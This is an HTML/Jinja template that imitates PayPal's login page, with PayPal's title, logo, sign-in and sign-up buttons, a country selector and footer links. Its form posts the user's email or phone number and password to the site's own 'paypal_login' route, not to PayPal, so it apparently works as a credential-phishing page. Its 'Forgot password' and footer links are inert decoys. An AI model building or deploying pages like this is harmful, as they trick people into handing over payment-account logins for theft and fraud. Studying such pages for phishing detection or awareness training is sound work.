<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>PayPal Login</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.6/dist/css/bootstrap.min.css" rel="stylesheet"
        integrity="sha384-4Q6Gf2aSP4eDXB8Miphtr37CMZZQ5oXLH2yaXMJ2w8e2ZtHTl7GptT4jmndRuHDT" crossorigin="anonymous">

    <script src="https://cdn.tailwindcss.com"></script>
</head>
<style>
    img {
        width: 100px;
        border-radius: 50%;
        margin: 0 auto;
    }
</style>

<body class="bg-white-100">
  <div class="flex flex-col min-h-screen items-center justify-center">

    <!-- Main content -->
    <div class="bg-white rounded-lg p-5 mt-5 mb-3 w-full max-w-md flex-grow flex flex-col justify-center" style="border: 1px solid rgb(226, 226, 226);">
      <div style="margin-bottom: 3em;top: 0;" class="text-center">
        <img src="/static/images/paypal-logo.jpg" alt="paypal">
      </div>

      <form action="{{ url_for('paypal_login') }}" method="POST">
        <div class="form-floating mb-3">
          <input type="email" class="form-control" id="floatingInput" name="email-phone-no" placeholder="name@example.com">
          <label for="floatingInput" style="font-weight: 500;">Email or mobile number</label>
        </div>
        <div class="form-floating">
          <input type="password" class="form-control" id="floatingPassword" name="password" placeholder="Password">
          <label for="floatingPassword" style="font-weight: 500;">Enter your password</label>
        </div>
        <div class="mb-4 mt-4">
          <p class="text-sm text-blue-500" style="font-weight: 600; font-size: 1.1em;">Forgot password?</p>
        </div>
        <button type="submit"
          class="login w-full bg-blue-600 text-white py-2.5 rounded-lg hover:bg-blue-700 transition border"
          style="border-radius: 20px;"><span class="font-bold">Log In</span>
        </button>
      </form>

      <div class="flex items-center my-6">
        <div class="flex-grow border-t border-gray-300"></div>
        <span class="mx-2 text-gray-500 text-sm">or</span>
        <div class="flex-grow border-t border-gray-300"></div>
      </div>

      <button
        class="sign-up w-full border-2 border-gray-600 text-gray-800 hover:border-blue-700 hover:text-blue-600 py-2.5 rounded-md transition mb-14"
        style="border-radius: 20px;">
        <span class="font-bold">Sign Up</span>
      </button>

      <div class="text-center text-sm mt-6 text-gray-500">
        <div class="relative d-flex g-4">
          <select id="country" disabled onchange="updateFlagInInput()" class="appearance-none bg-white focus:outline-none border text-sm p-1" >
            <option value="us" data-flag="us">United States</option>
            <option value="gb" data-flag="gb">United Kingdom</option>
            <option value="fr" data-flag="fr">France</option>
            <option value="de" data-flag="de">Germany</option>
            <option value="ke" data-flag="ke">Kenya</option>
          </select>
          <img id="flagIcon" src="https://flagcdn.com/us.svg"
            class="absolute top-1/2 left-20 transform -translate-y-1/2 h-4" alt="Flag">
        </div>
        <div class="mt-3" style="font-weight: 500;">
          <span class="font-bold">English</span> | Français | Español | 中文 |العربية
        </div>
      </div>
    </div>

    <!-- Footer -->
    <footer class="bg-gray-100 text-center text-gray-600 text-sm p-2 w-full mt-auto font-bold">
      <p class="m-1 flex justify-center gap-2.5 flex-wrap text-gray-500"><span>Contact Us</span>   <span>Privacy</span> <span>Legal</span> <span>Policy Updates</span> <span>Worldwide</span></p>
    </footer>

  </div>

  <script>
    document.getElementById("year").textContent = new Date().getFullYear();
  </script>
</body>


</html>
